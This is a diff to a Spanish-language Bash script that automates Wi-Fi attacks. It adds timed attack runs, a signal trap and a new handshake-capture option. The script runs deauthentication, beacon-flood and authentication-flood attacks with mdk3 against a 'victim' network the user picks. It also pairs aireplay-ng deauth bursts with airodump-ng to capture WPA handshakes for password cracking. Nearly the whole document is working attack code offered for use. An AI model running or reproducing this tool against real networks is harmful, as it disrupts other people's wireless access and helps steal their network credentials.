@@ -3,8 +3,9 @@
 #Author: Facu Salgado parte del codigo esta hecho por Hacking.con.H
 
 # trap ctrl-c and call ctrl_c()
+trap ctrl_c INT
 
-
+s="s"
 
 
 #Colors
@@ -22,13 +23,33 @@ blue="\033[1;34m"
 nc="\e[0m"
 mon="mon"
 
+
+function ctrl_c() {
+echo -e "$nc($blue*$nc)$green Presionaste la tecla$red CTRL + C$green Saliendo del Programa.."
+sleep 2
+echo -e "$nc($blue*$nc)$green Detiendo modo monitor en 1 segundo..$nc"
+sleep 1
+airmon-ng stop wlan0mon
+airmon-ng stop eth0mon
+echo -e "$nc($blue*$nc)$green Modo monitor detenido..$nc"
+echo -e "$nc($blue*$nc)$green Gracias por usar nuestro Script $blue by Facu Salgado..$nc"
+sleep 1
+exit
+
+}
+
+
+
+
+
 #Opciones menu
 
 a="Deauth"
 b="Flood Fake Point"
 c="Auth"
 d="Detener Monitor Mode"
-e="Salir"
+e="Capturar Handshake"
+f="Salir"
 
 
 #verificacion de Dependencias by Hacking.con.H
@@ -109,12 +130,16 @@ echo -e "$green"
 echo "Script creado por Facu Salgado"
 sleep 1
 echo -e "Regalanos una estrella en github$yellow"
-echo
+
 PS3="Selecciona una Opcion: "
+
 
 #menu principal
 
-select menu in "$a" "$b" "$c" "$d" "$e";
+function menu_principal(){
+echo
+echo
+select menu in "$a" "$b" "$c" "$d" "$e" "$f";
 do
 case $menu in 
 
@@ -147,9 +172,9 @@ echo -e "$nc($blue*$nc)$green Modo monitor iniciado correctamente"
 sleep 2
 echo -e "$nc($blue*$nc)$green Ahora haremos un analisis de las redes disponibles"
 sleep 2
-echo -e "$nc($blue*$nc)$green Espera 10 segundos cuando inicie el analisis y presiona CTRL + C despues"
-sleep 6
-airodump-ng $interface$mon
+echo -e "$nc($blue*$nc)$red AVISO: Espera 10 segundos$green cuando inicie el analisis"
+sleep 9
+timeout --foreground 12s airodump-ng $interface$mon
 echo
 echo -e "$green"
 read -p "añade el BSSID victima ➜ " bssid
@@ -158,6 +183,8 @@ read -p "añade el CANAL de la red (CH) ➜ " ch
 sleep 2
 read -p "Añade el nombre en txt para guardar el BSSID ➜ " doc
 echo $bssid > $doc
+sleep 2
+read -p "Añade la duracion del ataque en segundos ➜ " sec
 sleep 2
 echo -e "$nc($blue*$nc)$green El ataque sera realizado al BSSID:$blue $bssid $green En el Canal: $ch"
 sleep 2
@@ -171,8 +198,14 @@ echo "2 segundos.."
 sleep 1
 echo "1 segundo"
 sleep 1
-echo -e "$nc($blue*$nc)$red Ataque Iniciado..$green presione ctrl + c para cancelar el ataque$nc"
-mdk3 $interface$mon d -b $doc -c $ch
+echo -e "$nc($blue*$nc)$red Ataque Iniciado..$green Tiempo restante de ataque:$blue $sec$green Segundos $nc"
+timeout --foreground $sec$s mdk3 $interface$mon d -b $doc -c $ch
+echo -e "$nc($blue*$nc)$green el ataque ha Finalizado..$yellow"
+sleep 2
+echo -e "$nc($blue*$nc)$green Deteniendo modo monitor$yellow"
+sleep 2
+airmon-ng stop $interface$mon
+menu_principal
 ;;
 
 $b)
@@ -194,6 +227,8 @@ sleep 2
 airmon-ng start $interface
 pkill dhclient && pkill wpa_supplicant
 echo -e "$nc($blue*$nc)$green Modo monitor iniciado correctamente"
+echo -e "$green"
+read -p "EScriba tiempo de ataque en segundos ➜ " sec
 sleep 2
 echo -e "$nc($blue*$nc)$green El ataque comenzara en 5 segundos.."
 sleep 1
@@ -205,13 +240,24 @@ echo "2 segundos"
 sleep 1
 echo "1 segundos"
 sleep 1
-echo -e "$nc($blue*$nc)$red ATAQUE INICIADO..$green PRESIONE CTRL + C para cancelar el ataque$nc"
-mdk3 $interface$mon b
-
+echo -e "$nc($blue*$nc)$red ATAQUE INICIADO..$green Tiempo restante de ataque:$blue $sec$green Segundos $nc"
+timeout --foreground $sec$s mdk3 $interface$mon b
+echo -e "$nc($blue*$nc)$green el ataque ha Finalizado..$yellow"
+sleep 2
+echo -e "$nc($blue*$nc)$green Deteniendo modo monitor$yellow"
+sleep 2
+airmon-ng stop $interface$mon
+menu_principal
 ;;
 
 $c)
 
+echo -e "$nc($blue*$nc)$green Este Ataque realizara un flood de intentos de conexion al router"
+sleep 2
+echo -e "$nc($blue*$nc)$green le mostraremos sus interfaces de red disponibles"
+sleep 2
+echo
+echo
 ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
 sleep 1
 echo -e "$green"
@@ -222,9 +268,9 @@ echo -e "$nc($blue*$nc)$green Modo monitor iniciado correctamente"
 sleep 2
 echo -e "$nc($blue*$nc)$green Ahora haremos un analisis de las redes disponibles"
 sleep 2
-echo -e "$nc($blue*$nc)$green Espera 10 segundos cuando inicie el analisis y presiona CTRL + C despues"
-sleep 6
-airodump-ng $interface$mon
+echo -e "$nc($blue*$nc)$red AVISO: Espera 20 segundos$green cuando inicie el analisis"
+sleep 9
+timeout --foreground 20s airodump-ng $interface$mon
 echo -e "$green"
 read -p "añade el BSSID victima ➜ " bssid
 	echo -e "$white"
@@ -241,6 +287,9 @@ read -p "añade el CANAL de BSSID victima ➜ " ch
 read -p "añade el ESSID victima ➜ " essid
 	echo -e "$white"
 	echo -e "$essid" [$green✓$nc]
+	sleep 1
+	read -p "Añade la duracion del ataque en segundos ➜ " sec
+        sleep 2
 	echo -e "$nc($blue*$nc)$green El ataque comenzara en 5 segundos.."
 sleep 1
 echo "4 segundos"
@@ -251,8 +300,15 @@ echo "2 segundos"
 sleep 1
 echo "1 segundos"
 sleep 1
-echo -e "$nc($blue*$nc)$red ATAQUE INICIADO..$green PRESIONE CTRL + C para cancelar el ataque$nc"
-mdk3 $interface$mon a -a $doc; bash
+echo -e "$nc($blue*$nc)$red Ataque Iniciado..$green Tiempo restante de ataque:$blue $sec$green Segundos $nc"
+sleep 2
+timeout --foreground $sec$s mdk3 $interface$mon a -a $doc
+echo -e "$nc($blue*$nc)$green el ataque ha Finalizado..$yellow"
+sleep 2
+echo -e "$nc($blue*$nc)$green Deteniendo modo monitor$yellow"
+sleep 2
+airmon-ng stop $interface$mon
+menu_principal
 
 
 ;;
@@ -278,22 +334,85 @@ airmon-ng stop $interface
 echo -e "$nc($blue*$nc)$green Modo monitor detenido.. saliendo$nc"
 exit
 
-
-
 ;;
 
 $e)
 
-echo -e  "$red(saliendo)..$nc"
-exit
+echo -e "$nc($blue*$nc)$green Este Ataque capturara un handshake de una RED"
+sleep 2
+echo -e "$nc($blue*$nc)$green Les mostraremos sus interfaces disponibles"
+sleep 2
+ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
+sleep 1
+echo -e "$green"
+read -p "EScriba la interfaz ➜ " interface
+echo -e "$nc($blue*$nc)$green Ahora iniciaremos el modo monitor en tu interfaz"
+sleep 2
+airmon-ng start $interface
+pkill dhclient && pkill wpa_supplicant
+echo -e "$nc($blue*$nc)$green Modo monitor iniciado correctamente"
+sleep 2
+echo -e "$nc($blue*$nc)$green Ahora haremos un analisis de las redes disponibles"
+sleep 2
+echo -e "$nc($blue*$nc)$red AVISO: Espera 25 segundos$green cuando inicie el analisis"
+sleep 9
+timeout --foreground 25s airodump-ng $interface$mon
+echo
+echo -e "$green"
+read -p "añade el BSSID victima ➜ " bssid
+sleep 2
+read -p "añade el CANAL de la red (CH) ➜ " ch
+sleep 2
+read -p "Añade el nombre del para el archivo pcap ➜ " doc
+echo $bssid > $doc
+sleep 2
+read -p "Añade la duracion del ataque(deauth) en segundos ➜ " sec
+sleep 2
+echo -e "$nc($blue*$nc)$green El ataque sera realizado al BSSID:$blue $bssid $green En el Canal: $ch"
+sleep 2
+echo -e "$nc($blue*$nc)$green el ataque Iniciara en 5 segundos.."
+sleep 1
+echo "4 segundos.."
+sleep 1
+echo "3 segundos.."
+sleep 1
+echo "2 segundos.."
+sleep 1
+echo "1 segundo"
+sleep 1
+timeout --foreground 2s airodump-ng --bssid $bssid -c $ch $interface$mon
+echo -e "$nc($blue*$nc)$green ejecutando xterm en 5 segundos.."
+sleep 5
+timeout --foreground 40s xterm -hold -e "airodump-ng -w handshake/$doc.cap --bssid $bssid -c $ch $interface$mon" & 
+timeout --foreground 25s xterm -hold -e "aireplay-ng --deauth 0 -a $bssid $interface$mon"
+echo -e "$nc($blue*$nc)$green El handshake fue capturado exitosamente PATH:$blue handshake/$doc.pcap"
+sleep 4
+echo -e "$nc($blue*$nc)$green el ataque ha Finalizado..$yellow"
+sleep 2
+echo -e "$nc($blue*$nc)$green Deteniendo modo monitor$yellow"
+sleep 2
+airmon-ng stop $interface$mon
+menu_principal
+
 
 
 ;;
 
+$f)
+
+airmon-ng stop wlan0mon
+airmon-ng stop eth0mon
+echo -e "$nc($blue*$nc)$green Modo monitor detenido..$nc"
+echo -e "$nc($blue*$nc)$green Gracias por usar nuestro Script $blue by Facu Salgado..$nc"
+sleep 1
+exit
+;;
+
+
 *)
-echo -e "$red(ERROR)$green Opcion no vaida $nc"
+echo -e "$red(ERROR)$green Opcion no valida $nc"
 ;;
 esac 
 done
-
-
+}
+menu_principal
